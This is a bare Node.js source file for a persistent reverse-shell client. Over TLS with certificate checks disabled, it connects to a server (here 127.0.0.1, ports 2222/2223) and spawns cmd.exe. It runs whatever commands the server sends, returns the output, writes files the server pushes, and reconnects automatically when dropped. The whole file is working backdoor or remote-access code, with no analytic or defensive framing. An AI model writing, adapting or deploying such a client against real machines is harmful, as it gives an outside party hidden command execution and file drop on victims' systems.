"use strict";
const tls = require('tls')
const fs = require('fs')
const child = require('child_process')
const { exec } = require('child_process');
const { cpuUsage } = require('process');

/**
 * options object stores the private key and public cert to be used by tls socket for traffic encryption.
 */
const _options = {
    key: fs.readFileSync('client-cert/private-key.pem'),
    cert: fs.readFileSync('client-cert/public-cert.pem'),
    rejectUnauthorized: false
}

// flag variable to let the client know if it needs to reconnect to the server
const _fsPort = 2223
const _comPort = 2222
const _host = '127.0.0.1'
// let comClient = {}
let fsClient = {}
let comAlive = false
let connID

const writeFile = (destination) => {
    if (destination) {
        console.log('destination', destination)
        let destfs = fs.createWriteStream('./' + destination)

        fsClient.pipe(destfs)

        fsClient.on('end', () => {
            console.log('File should be written')
            destfs.close()
        })

        destfs.on('error', (err) => {
            console.log(err)
        })
    }
}

/**
 * Function: Spawns a zsh/cmd/sh child process and streams the stdout back to client socket
 * @param {*} client 
 */
const shellSpawn = (comClient) => { //client, fsClient
    const shell = child.spawn("cmd.exe", []); //cmd.exe , zsh

    shell.stdout.on('data', (data) => {
        if (comClient) {
            // console.log(data)
            comClient.write(data)
        }
    });

    shell.stderr.on('data', (data) => {
        if (comClient) {
            // console.log(data)
            comClient.write(data)
        }
    });

    shell.on('close', () => {
        shellSpawn(comClient)
        console.log('Shell Spawned')
    })

    /**
     * Data from server is broken up into few parts:
     * if the first character is 0 : execute as a shell command
     * if the first character is 1 : write to console 
     * if the first character is 2 : reset the shell child process
     */
     comClient.on('data', (data) => {
        let msg = data.toString()
        // console.log('msg[0]', msg[0])
        switch (msg.substr(0, 3)) {
            case '_+0':
                shell.stdin.write(msg.substr(3))
                break
            case '_+1':
                console.log('Server: ' + msg.substr(3))
                break
            case '_+2':
                shell.kill()
                break
            case '_+3':
                console.log('Receiving file', msg)
                writeFile(msg.substr(3))
                break
            case '_+4':
                console.log(msg.substr(3))
                connID = msg.substr(3)
                fsClient.write('_+4' + connID)
                break
        }
    })
}

const asyncCall = (callback) => new Promise((resolve) => {
    callback(resolve)
})

const serverConnect = (PORT, HOST, tlsCerts, comClient, cb) => {
    const client = tls.connect(PORT, HOST, tlsCerts)

    client.on('secure', () => {
        console.log(`Connected to port ${PORT}`)
        if (cb) {
            cb(client)
        }
        if(comAlive && connID) {
            console.log(connID)
            client.write('_+4' + connID)
        }
    })

    client.on('close', () => {
        console.log(`${PORT} connection closed... reconnecting...`)
        client.destroy()
        if(comAlive == true) {
            setTimeout(() => {
                fsClient = serverConnect(PORT, HOST, tlsCerts, cb)
            }, 1000)
        }
    })

    // if the socket throws an error, destroy the socket, and attempt to reconnect with new socket
    client.on('error', (error) => {
        console.log(error)
        client.destroy()
    })

    return client
}

//===========================

const TESTserverConnect = (PORT, HOST, tlsCerts) => {
    const client = tls.connect(PORT, HOST, tlsCerts)

    client.on('secure', async () => {
        comAlive = true
        console.log(`Connected to port ${PORT}`)
        fsClient = await asyncCall((resolve) => {
            return serverConnect(_fsPort, _host, _options, client, resolve)
        })
        shellSpawn(client)
    })

    client.on('close', () => {
        comAlive = false
        connID = undefined
        console.log(`${PORT} connection closed... reconnecting...`)
        // fsClient.destroy()
        client.destroy()
        setTimeout(() => {
            TESTserverConnect(PORT, HOST, tlsCerts)
        }, 5000)
    })

    // if the socket throws an error, destroy the socket, and attempt to reconnect with new socket
    client.on('error', (error) => {
        comAlive = false
        connID = undefined
        console.log(error)
        // fsClient.destroy()
        client.destroy()
    })

    return client
}

//===========================

TESTserverConnect(_comPort, _host, _options)

// // Run function on first execution to create connection
// const main = async () => {
//     comClient = await asyncCall((resolve) => {
//         return TESTserverConnect(2222, '127.0.0.1', options, resolve)
//     })

//     // comClient = await asyncCall((resolve) => {
//     //     return serverConnect(2222, '127.0.0.1', options, resolve)
//     // })
    
//     // fsClient = await asyncCall((resolve) => {
//     //     return serverConnect(2223, '127.0.0.1', options, resolve)
//     // })
    
//     // shellSpawn()
// }

// main()